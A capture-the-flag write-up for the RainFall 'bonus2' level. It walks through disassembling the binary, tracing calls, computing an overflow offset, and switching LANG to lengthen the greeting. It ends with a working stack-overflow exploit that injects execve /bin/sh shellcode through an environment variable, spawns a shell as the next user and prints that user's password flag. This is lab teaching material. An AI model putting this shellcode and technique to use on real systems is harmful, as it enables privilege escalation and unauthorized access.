# We have a executable "bonus2" lets do some test!

>bonus2@RainFall:~$ ./bonus2
>bonus2@RainFall:~$ ./bonus2 test
>bonus2@RainFall:~$ ./bonus2 test test
Hello test
>bonus2@RainFall:~$ ./bonus2 test test test
>bonus2@RainFall:~$ ./bonus2 test1 test2 
Hello test1
>bonus2@RainFall:~$

# The programs take two arguments and display Hello plus arg1

# Let's learn more with gdb

>bonus2@RainFall:~$ gdb bonus2
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x0804855a <+49>:	rep stos %eax,%es:(%edi)
[...]
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
[...]
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	movl   $0x8048738,(%esp)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
[...]
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   %eax,%eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	movl   $0x1,0x8049988
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:	mov    0x9c(%esp),%eax
   0x08048602 <+217>:	mov    %eax,(%esp)
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   %eax,%eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	movl   $0x2,0x8049988
[...]
   0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    -0xc(%ebp),%esp
[...]

# So the program start by a memset (rep stos) call two times strncpy, one time getenv, do two memcpy and call greetuser

(gdb) disas greetuser
[...]
   0x0804848a <+6>:	mov    0x8049988,%eax
   0x0804848f <+11>:	cmp    $0x1,%eax
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    $0x2,%eax
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   %eax,%eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
   0x0804849d <+25>:	mov    $0x8048710,%edx
[...]
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    $0x8048717,%edx
[...]
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    $0x804872a,%edx
[...]
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    0x8(%ebp),%eax
   0x0804850d <+137>:	mov    %eax,0x4(%esp)
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax
   0x08048514 <+144>:	mov    %eax,(%esp)
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax
   0x0804851f <+155>:	mov    %eax,(%esp)
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
[...]

# Depending of the value of eax, the value for edx change and at the end strcat and puts the final string.

# Let's use ltrace to see if we can get more informations

>bonus2@RainFall:~$ ltrace ./bonus2 test1 test2
__libc_start_main(0x8048529, 3, 0xbffff6e4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff5e0, "test1", 40)                                                                                              = 0xbffff5e0
strncpy(0xbffff608, "test2", 32)                                                                                              = 0xbffff608
getenv("LANG")                                                                                                                = "en_US.UTF-8"
memcmp(0xbffffed3, 0x804873d, 2, 0xb7fff918, 0)                                                                               = -1
memcmp(0xbffffed3, 0x8048740, 2, 0xb7fff918, 0)                                                                               = -1
strcat("Hello ", "test1")                                                                                                     = "Hello test1"
puts("Hello test1"Hello test1
)                                                                                                           = 12
+++ exited (status 12) +++
>bonus2@RainFall:~$ 

# Nice, the program strncpy both arguments and we can make them overlap like in bonus0. Plus the getenv is for the LANG variable and since it strcat the first argument maybe we can overwrite eip like in bonus0.

# But first let's see whats the memcmp compare.

>bonus2@RainFall:~$ gdb bonus2
(gdb) x/s 0x804873d
0x804873d:	 "fi"
(gdb) x/s 0x8048740
0x8048740:	 "nl"
(gdb) 

# Maybe if we change the LANG variable the behavior will change?

>bonus2@RainFall:~$ export LANG=fi
>bonus2@RainFall:~$ ./bonus2 test1 test2
Hyvää päivää test1
>bonus2@RainFall:~$ export LANG=nl
>bonus2@RainFall:~$ ./bonus2 test1 test2
Goedemiddag! test1
>bonus2@RainFall:~$

# Yep the Hello is remplace! After set the LANG var as before let's calculte the padding.

(gdb) b *0x08048517
Breakpoint 1 at 0x8048517
(gdb) r test1 test2
Starting program: /home/user/bonus2/bonus2 test1 test2

Breakpoint 1, 0x08048517 in greetuser ()
(gdb) i r
eax            0xbffff520	-1073744608
ecx            0x206f	8303
edx            0x0	0
ebx            0xbffff5c0	-1073744448
esp            0xbffff510	0xbffff510
ebp            0xbffff568	0xbffff568
esi            0xbffff60c	-1073744372
edi            0xbffff5bc	-1073744452
eip            0x8048517	0x8048517 <greetuser+147>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/s $eax
0xbffff520:	 "Hello "
(gdb) i f
Stack level 0, frame at 0xbffff570:
 eip = 0x8048517 in greetuser; saved eip 0x8048630
 called by frame at 0xbffff630
 Arglist at 0xbffff568, args: 
 Locals at 0xbffff568, Previous frame's sp is 0xbffff570
 Saved registers:
  ebp at 0xbffff568, eip at 0xbffff56c

# The padding is eip - eax (0xbffff56c - 0xbffff520) = 76 (decimal value)

# But we only can write 78 (40 + 32 + 6) character and we need 80 to completly rewrite eip

# But we have a solution for this ! We can change the LANG variable so the "Hello " will be transform to a longer string.

>bonus2@RainFall:~$ env -i LANG=nl gdb bonus2
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)

# It works ! Now we just need to create a env variable with our shellcode and redirect the address of eip inside.

>bonus2@RainFall:~$ env -i cmd=$(python -c "print('\x90' * 1000 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')") LANG=nl ./bonus2 $(python -c "print('A' * 40)") $(python -c "print('B' * 23 + '\x32\xfd\xff\xbf')")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB2���
$ whoami
bonus3
$ cd ..
$ cd bonus3
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

# Only 23 'B' because (13 + 40 + 23 = 76)





